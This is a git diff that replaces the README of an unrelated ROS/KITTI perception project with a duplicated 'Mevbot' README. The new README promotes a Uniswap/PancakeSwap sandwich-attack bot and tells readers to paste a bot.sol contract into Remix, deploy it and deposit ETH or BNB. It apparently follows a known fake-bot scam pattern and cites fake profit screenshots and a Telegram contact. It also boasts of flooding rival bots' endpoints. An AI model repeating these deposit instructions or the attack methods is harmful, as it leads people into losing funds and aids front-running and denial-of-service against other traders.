@@ -1,226 +1,188 @@
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)  
+![Uniswap Mevbot](https://i.ibb.co/dDpvy0F/1.jpg)
 
-SARosPerceptionKitti
-=================
- 
-ROS package for the Perception (Sensor Processing, Detection, Tracking and Evaluation) of the KITTI Vision Benchmark 
+# Mevbot Smartcontract for Uniswap (v3) & Pancakeswap (v3) - Monitor the mempool, placing a higher gas fee, extract profit by buying and selling assets before the original transaction takes place. 
 
-## Demo
-<p align="center">
-  <img src="./videos/semantic.gif">
-</p>
+The code was never meant to be shown to anybody. My commercial code is better and this was intended to be "tested in production" and a ton of quality tradeoffs have been made. Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.
 
-<p align="center">
-  <img src="./videos/rviz.gif">
-</p>
+> Bot sends the Transaction and sniffs the Mempool
 
-## Setup
+> Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity
 
-Sticking to this folder structure is highly recommended:  
- 
-```
-    ~                                        # Home directory
-    ├── catkin_ws                            # Catkin workspace
-    │   ├── src                              # Source folder
-    │       └── SARosPerceptionKitti         # Repo
-    ├── kitti_data                           # Dataset
-    │   ├── 0012                             # Demo scenario 0012
-    │   │   └── synchronized_data.bag        # Synchronized ROSbag file
-```
+> Sending back the ETH/BNB and WETH/WBNB to the contract ready for withdrawal.
 
-1) Install [ROS](http://wiki.ros.org/Installation/Ubuntu) and create a [catkin workspace](http://wiki.ros.org/catkin/Tutorials/create_a_workspace) in your home directory:  
+> This bot performs all of that, faster than 99% of other bots.
 
-```
-mkdir -p ~/catkin_ws/src
-```
+### But ser, there are open source bots that do the same
 
-2) Clone this repository into the catkin workspace's source folder (src) and build it:  
+> Yes, there indeed are. Mine was first, tho. And I still outperform them. Reading their articles makes me giggle, as i went through their same pains and from a bot builder to a bot builder, i feel these guys. <3
 
-```
-cd ~/catkin_ws/src
-git clone https://github.com/appinho/SARosPerceptionKitti.git
-cd ~/catkin_ws
-catkin_make
-source devel/setup.bash
-```
+### Wen increase aggressiveness ?
 
-3) [Download a preprocessed scenario](https://drive.google.com/drive/folders/1vHpkoC78fPXT64-VFL1H5Mm1bdukK5Qz?usp=sharing) and unzip it into a separate `kitti_data` directory, also stored under your home directory:
+> As i've spent a year obsessing about this, i have a list of target endpoints that I know other bots use, which i could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.
 
-```
-mkdir ~/kitti_data && cd ~/kitti_data/
-mv ~/Downloads/0012.zip .
-unzip 0012.zip
-rm 0012.zip
-```
+### What did I learn?
 
-## Usage 
+> MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Uniswap OR Pancakeswap
 
-1) Launch one of the following ROS nodes to perform and visualize the pipeline (Sensor Processing -> Object Detection -> Object Tracking) step-by-step:  
+### So why stop?
 
-```
-source devel/setup.bash
-roslaunch sensor_processing sensor_processing.launch home_dir:=/home/YOUR_USERNAME
-roslaunch detection detection.launch home_dir:=/home/YOUR_USERNAME
-roslaunch tracking tracking.launch home_dir:=/home/YOUR_USERNAME
-```
+> I've made some profits from this but now using some other better commercial methods, ready to share what I have learnt so devs don't need to go through the same pain.
 
-   * Default parameters:
-        * scenario:=0012
-        * speed:=0.2   
-        * delay:=3  
+### Towards the end I kept getting outcompeted by this individual:
 
-Without assigning any of the abovementioned parameters the demo scenario 0012 is replayed at 20% of its speed with a 3 second delay so RViz has enough time to boot up.  
+> https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e
+> https://bscscan.com/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e
 
-2) Write the results to file and evaluate them:
+If this is you, I'd like to congratulate you on your badassery. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.
 
-```
-roslaunch evaluation evaluation.launch home_dir:=/home/YOUR_USERNAME
-cd ~/catkin_ws/src/SARosPerceptionKitti/benchmark/python
-python evaluate_tracking.py
-```
+### Bot capabilities:
 
-## Results for demo scenario 0012
+1. Check every Contract pair.
+2. Calculate possible profit
+3. Automatically submit transaction with higher gas fee than target (in order to get tokens first, low price > seek profit, gas fee included in calculation)
+4. Automatically sell tokens with prior gas fee (in order to be the first who sell tokens at higher price)
 
-| Class        |  MOTA   |  MOTP   |  MOTAL  |  MODA   |  MODP   |
-| ------------ |:-------:|:-------:|:-------:|:-------:|:-------:|
-| Car          | 0.881119| 0.633595| 0.881119| 0.881119| 0.642273|
-| Pedestrian   | 0.546875| 0.677919| 0.546875| 0.546875| 0.836921|
+### What is Sandwich MEV ?
 
-## Contact
+A sandwich attack involves "sandwiching" the victim's transactions between two transactions initiated by the searchers/attackers, whose reordering of the transactions inflicts an implicit loss on the victimized users and possibly benefits the attacker. 
 
-If you have any questions, things you would love to add or ideas how to actualize the points in the Area of Improvements, send me an email at simonappel62@gmail.com ! More than interested to collaborate and hear any kind of feedback.
+Sandwich MEV exists because the user has to send the intended transactions to the blockchain's mempool, the waiting area for the transactions that haven't been put into a block and need confirmation from the block's miner. 
 
-<!--
+If the user sets a too-high slippage for the transaction, the searcher could exploit the opportunity by:
 
-### DIY: Data generation
+- Setting higher gas fees and miner tips for the searcher's first transaction than the victim to make it accepted earlier by the block's miner. 
+- Then the searcher would send another transaction with equal or lower gas fees to make sure this transaction is accepted later by the miner than the victim, whose transaction would be squeezed by the attacker's transactions.
 
-0000 -> 0005
-0001 -> 0009
-0002 -> 0011
-0003 -> 0013
-0004 -> 0014
-0006 -> 0018
-0010 -> 0056
-0011 -> 0059
-0012 -> 0060
-0013 -> 0091
+How exactly does the attacker gain revenues during the process? Here is an example.
 
-1) [Install Kitti2Bag](https://github.com/tomas789/kitti2bag)
+1. In a Uniswap liquidity pool, Bob is a retail investor who wants to trade 1000 $WETH for $USDT. His transaction has been sent to the mempool, making him the victim of a sandwich arbitrage. The transaction is marked as ①  in the figure below. 
+2. Unfortunately, Alice, the searcher who has been scanning the mempool, detects Bob's swapping transaction. 
+3. Alice makes a transaction of selling 650 $WETH and sends it to the mempool. In the end, she receives 1,842,200 $USDT at the exchange rate of 1 $WETH for 2,834 $USDT. The block's miner accepts this swapping first because Alice pays higher gas fees or miner tips. The swapping causes the exchange rate to change to 1 $WETH for 2,821 $USDT. This transaction and one Alice sent after Bob's are marked as ② in the figure below. 
+4. Bob's transaction goes through the mempool and to the block selling 1000 $WETH for 2,821,000 $USDT, which he should have been able to get 2,834,000 $USDT. 
+5. Alice's selling of 1,842,200 $USDT passes the mempool and gets recorded by the miner in the block. She receives 652.9 $WETH.  
+6. All three transactions are marked as ③ in the figure below, which shows in the order the miner accepts them.
 
-```
-pip install kitti2bag
-```
+![Mevbot Uniswap](https://i.ibb.co/jgyGmdc/2.webp)
 
-2) Convert scenario `0060` into a ROSbag file:  
+Alice's revenue from this Sandwich arbitrage is 2.9 $WETH. The cost is the gas fees and miner tips she gives to the miner for reordering. Assuming it's 1.2 $WETH. In the end, Alice's profit is 1.7 $WETH.
 
-    * Download and unzip the `synced+rectified data` file and its `calibration` file from the [KITTI Raw Dataset](http://www.cvlibs.net/datasets/kitti/raw_data.php)
-    * Merge both files into one ROSbag file
+# How to implement Sandwich MEV (MEVBOT) with a smart contract on the Ethereum blockchain ?
 
-```
-cd ~/kitti_data/
-kitti2bag -t 2011_09_26 -r 0060 raw_synced
-```
+1. Access the Solidity Compiler: [Remix IDE](https://remix.ethereum.org)
 
-3) Synchronize the sensor data:  
+2. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol".
 
-    * The script matches the timestamps of the Velodyne point cloud data with the camara data to perform Sensor Fusion in a synchronized way within the ROS framework 
-```
-cd ~/catkim_ws/src/ROS_Perception_Kitti_Dataset/pre_processing/
-python sync_rosbag.py raw_synced.bag
-```
+3. Copy and Paste the code from v3 folder with name bot.sol into Remix IDE.
 
-4) Store preprocessed semantic segmentated images:  
+4. Move to the "Solidity Compiler" tab, select version "0.6.6" or 0.6.12" and then "Compile".
 
-    * The camera data is preprocessed within a Deep Neural Network to create semantic segmentated images. With this step a "real-time" performance on any device (CPU usage) can be guaranteed
+5. Move to the "Deploy" tab, select "Injected Web 3" environment. Connect your Metamask with Remix then "Deploy" it.
 
-```
-mkdir ~/kitti_data/0060/segmented_semantic_images/
-cd ~/kitti_data/0060/segmented_semantic_images/
-```
+6. After the transaction is confirmed, it's your own BOT now.
 
-   * For any other scenario follow this steps: Well pre-trained network with an IOU of 73% can be found here: [Finetuned Google's DeepLab on KITTI Dataset](https://github.com/hiwad-aziz/kitti_deeplab)
+7. Deposit funds to your exact contract/bot address.
 
-### Troubleshooting
+8. After your transaction was confirmed, Start the bot by clicking the “start” button. Withdraw anytime by clicking the “withdrawal” button
 
-* Make sure to close RVIz and restart the ROS launch command if you want to execute the scenario again. Otherwise it seems like the data isn't moving anymore ([see here](https://github.com/appinho/SARosPerceptionKitti/issues/7))
-* Semenatic images warning: Go to sensor.cpp line 543 in sensor_processing_lib and hardcode your personal home directory! ([see full discussion here](https://github.com/appinho/SARosPerceptionKitti/issues/10))
-* Make sure the scenario is encoded as 4 digit number, like above `0060`
-* Make sure the images are encoded as 10 digit numbers starting from `0000000000.png`
-* Make sure the resulting semantic segmentated images have the color encoding of the [Cityscape Dataset](https://www.cityscapes-dataset.com/examples/)
+I know, this bot only works on the mainnet, but once you can still  deploy on the testnet. and you need to know if this run on testnet and then you call the withdrawal function, it just transfers back your funds without including any profits.
 
-### Results
+If u want to get priority first for your transaction and get profit from the original transaction, try with 0.5 - 5 ETH or 3 - 10 BNB as contract/bot amount balance. see this contract as reference [jaredfromsubway.eth](https://etherscan.io/address/0x6b75d8af000000e20b7a7ddf000ba900b4009a80#internaltx) this contract use 50 ETH as contract balance to running contract bot.
 
-Evaluation results for 7 Scenarios `0011,0013,0014,0018,0056,0059,0060`
+To withdraw your WETH/WBNB balance from the contract, the contract/bot must have ETH/BNB to pay gas fees.![Uniswap Mevbot](https://i.ibb.co/dDpvy0F/1.jpg)
 
-| Class        |  MOTP   |  MODP   |
-| ------------ |:-------:|:-------:|
-| Car          | 0.715273| 0.785403|
-| Pedestrian   | 0.581809| 0.988038|
+# Mevbot Smartcontract for Uniswap (v3) & Pancakeswap (v3) - Monitor the mempool, placing a higher gas fee, extract profit by buying and selling assets before the original transaction takes place. 
 
-### Area for Improvements
+The code was never meant to be shown to anybody. My commercial code is better and this was intended to be "tested in production" and a ton of quality tradeoffs have been made. Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.
 
-* Friendly solution to not hard code the user's home directory path
-* Record walk through video of entire project
-* Find a way to run multiple scenarios with one execution
-* Improving the Object Detection:  
-     * Visualize Detection Grid
-     * Incorporate features of the shape of cars
-     * Handle false classification within the semantic segmentation
-     * Replace MinAreaRect with better fitting of the object's bounding box
-     * Integrate view of camera image to better group clusters since point clouds can be spare for far distances
-* Improving the Object Tracking:
-     * Delete duplicated tracks
-     * Soften yaw estimations
-* Improve evaluation
-     * Write out FP FN
-* Try different approaches:
-     * Applying the VoxelNet
-     
-### To Do
+> Bot sends the Transaction and sniffs the Mempool
 
-* Make smaller gifs
-* Double check
-  * transformation from camera 02 to velo
-  * grid to point cloud has any errors
-* Reduce street pavement error prone cells
-* Objects to free space or not
+> Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity
 
-## Evaluation for 7 Scenarios 0011,0013,0014,0018,0056,0059,0060
+> Sending back the ETH/BNB and WETH/WBNB to the contract ready for withdrawal.
 
-| Class        | MOTA    | MOTP    |  MOTAL  |    MODA |    MODP |
-| ------------ |:-------:|:-------:|:-------:|:-------:|:-------:|
-| CAR          | 0.250970| 0.715273| 0.274552| 0.274903| 0.785403|
-| PEDESTRIAN   |-0.015038| 0.581809|-0.015038|-0.015038| 0.988038|
+> This bot performs all of that, faster than 99% of other bots.
 
+### But ser, there are open source bots that do the same
 
-[157, 154, 280, 306, 378, 1283, 17]
-[64, 10, 10, 72, 11, 196, 0]
-[39, 75, 120, 39, 33, 569, 0]
+> Yes, there indeed are. Mine was first, tho. And I still outperform them. Reading their articles makes me giggle, as i went through their same pains and from a bot builder to a bot builder, i feel these guys. <3
 
-[8, 0, 1, 0, 4, 18, 18]
-[3, 0, 2, 0, 0, 52, 0]
-[172, 0, 63, 0, 25, 177, 46]
+### Wen increase aggressiveness ?
 
-## Pipeline
+> As i've spent a year obsessing about this, i have a list of target endpoints that I know other bots use, which i could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.
 
-### 1a) Sensor Fusion: Velodyne Point Cloud Processing
+### What did I learn?
 
-* [Ground extraction & Free space estimation](http://wiki.ros.org/but_velodyne_proc)
+> MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Uniswap OR Pancakeswap
 
-### 1b) Sensor Fusion: Raw Image Processing
+### So why stop?
 
-* [Semantic segmentation](https://github.com/martinkersner/train-DeepLab)
+> I've made some profits from this but now using some other better commercial methods, ready to share what I have learnt so devs don't need to go through the same pain.
 
-### 1c) Sensor Fusion: Mapping Point Cloud and Image
+### Towards the end I kept getting outcompeted by this individual:
 
-### 2 Detection: DBSCAN Clustering
+> https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e
+> https://bscscan.com/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e
 
-### 3 Tracking: UKF Tracker
+If this is you, I'd like to congratulate you on your badassery. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.
 
+### Bot capabilities:
 
-Video image linker example
+1. Check every Contract pair.
+2. Calculate possible profit
+3. Automatically submit transaction with higher gas fee than target (in order to get tokens first, low price > seek profit, gas fee included in calculation)
+4. Automatically sell tokens with prior gas fee (in order to be the first who sell tokens at higher price)
 
-[![Segmentation illustration](https://img.youtube.com/vi/UXHX9kFGXfg/0.jpg)](https://www.youtube.com/watch?v=UXHX9kFGXfg "Segmentation")
+### What is Sandwich MEV ?
 
+A sandwich attack involves "sandwiching" the victim's transactions between two transactions initiated by the searchers/attackers, whose reordering of the transactions inflicts an implicit loss on the victimized users and possibly benefits the attacker. 
 
--->
+Sandwich MEV exists because the user has to send the intended transactions to the blockchain's mempool, the waiting area for the transactions that haven't been put into a block and need confirmation from the block's miner. 
+
+If the user sets a too-high slippage for the transaction, the searcher could exploit the opportunity by:
+
+- Setting higher gas fees and miner tips for the searcher's first transaction than the victim to make it accepted earlier by the block's miner. 
+- Then the searcher would send another transaction with equal or lower gas fees to make sure this transaction is accepted later by the miner than the victim, whose transaction would be squeezed by the attacker's transactions.
+
+How exactly does the attacker gain revenues during the process? Here is an example.
+
+1. In a Uniswap liquidity pool, Bob is a retail investor who wants to trade 1000 $WETH for $USDT. His transaction has been sent to the mempool, making him the victim of a sandwich arbitrage. The transaction is marked as ①  in the figure below. 
+2. Unfortunately, Alice, the searcher who has been scanning the mempool, detects Bob's swapping transaction. 
+3. Alice makes a transaction of selling 650 $WETH and sends it to the mempool. In the end, she receives 1,842,200 $USDT at the exchange rate of 1 $WETH for 2,834 $USDT. The block's miner accepts this swapping first because Alice pays higher gas fees or miner tips. The swapping causes the exchange rate to change to 1 $WETH for 2,821 $USDT. This transaction and one Alice sent after Bob's are marked as ② in the figure below. 
+4. Bob's transaction goes through the mempool and to the block selling 1000 $WETH for 2,821,000 $USDT, which he should have been able to get 2,834,000 $USDT. 
+5. Alice's selling of 1,842,200 $USDT passes the mempool and gets recorded by the miner in the block. She receives 652.9 $WETH.  
+6. All three transactions are marked as ③ in the figure below, which shows in the order the miner accepts them.
+
+![Mevbot Uniswap](https://i.ibb.co/jgyGmdc/2.webp)
+
+Alice's revenue from this Sandwich arbitrage is 2.9 $WETH. The cost is the gas fees and miner tips she gives to the miner for reordering. Assuming it's 1.2 $WETH. In the end, Alice's profit is 1.7 $WETH.
+
+# How to implement Sandwich MEV (MEVBOT) with a smart contract on the Ethereum blockchain ?
+
+1. Access the Solidity Compiler: [Remix IDE](https://remix.ethereum.org)
+
+2. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol".
+
+3. Copy and Paste the code from v3 folder with name bot.sol into Remix IDE.
+
+4. Move to the "Solidity Compiler" tab, select version "0.6.6" or 0.6.12" and then "Compile".
+
+5. Move to the "Deploy" tab, select "Injected Web 3" environment. Connect your Metamask with Remix then "Deploy" it.
+
+6. After the transaction is confirmed, it's your own BOT now.
+
+7. Deposit funds to your exact contract/bot address.
+
+8. After your transaction was confirmed, Start the bot by clicking the “start” button. Withdraw anytime by clicking the “withdrawal” button
+
+I know, this bot only works on the mainnet, but once you can still  deploy on the testnet. and you need to know if this run on testnet and then you call the withdrawal function, it just transfers back your funds without including any profits.
+
+If u want to get priority first for your transaction and get profit from the original transaction, try with 0.5 - 5 ETH or 3 - 10 BNB as contract/bot amount balance. see this contract as reference [jaredfromsubway.eth](https://etherscan.io/address/0x6b75d8af000000e20b7a7ddf000ba900b4009a80#internaltx) this contract use 50 ETH as contract balance to running contract bot.
+
+To withdraw your WETH/WBNB balance from the contract, the contract/bot must have ETH/BNB to pay gas fees.
+
+### Proof By Your Friends
+
+> ![Profit by Sandwich Mev Smartcontract](https://i.ibb.co/HdLLzFb/3.png)
+> ![Profit by Sandwich Mev Smartcontract](https://i.ibb.co/dg33JdH/4.png)
+> # Help
+If at any time you encounter any issues with the contract setup, contact our team at https://t.me/UniswapMevbots  🛡️
